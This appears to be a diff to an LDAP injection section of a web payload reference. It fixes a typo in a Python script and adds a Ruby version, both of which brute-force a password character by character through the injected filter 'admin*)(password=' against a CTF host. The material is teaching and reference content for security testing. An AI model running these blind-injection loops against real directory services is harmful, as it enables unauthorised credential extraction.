@@ -136,7 +136,7 @@ flag = ""
 for i in range(50):
     print("[i] Looking for number " + str(i))
     for char in alphabet:
-        r = requests.get("http://ctf.web??action=dir&search=admin*)(password=" + flag + char)
+        r = requests.get("http://ctf.web?action=dir&search=admin*)(password=" + flag + char)
         if ("TRUE CONDITION" in r.text):
             flag += char
             print("[+] Flag: " + flag)
@@ -144,6 +144,29 @@ for i in range(50):
 ```
 
 Ref. [5][5]
+
+```ruby
+#!/usr/bin/env ruby
+
+require 'net/http'
+alphabet = [*'a'..'z', *'A'..'Z', *'0'..'9'] + '_@{}-/()!"$%=^[]:;'.split('')
+
+flag = ''
+
+(0..50).each do |i|
+  puts("[i] Looking for number #{i}")
+  alphabet.each do |char|
+    r = Net::HTTP.get(URI("http://ctf.web?action=dir&search=admin*)(password=#{flag}#{char}"))
+    if /TRUE CONDITION/.match?(r)
+      flag += char
+      puts("[+] Flag: #{flag}")
+      break
+    end
+  end
+end
+```
+
+By [noraj](https://github.com/noraj)
 
 ## Google Dorks
 
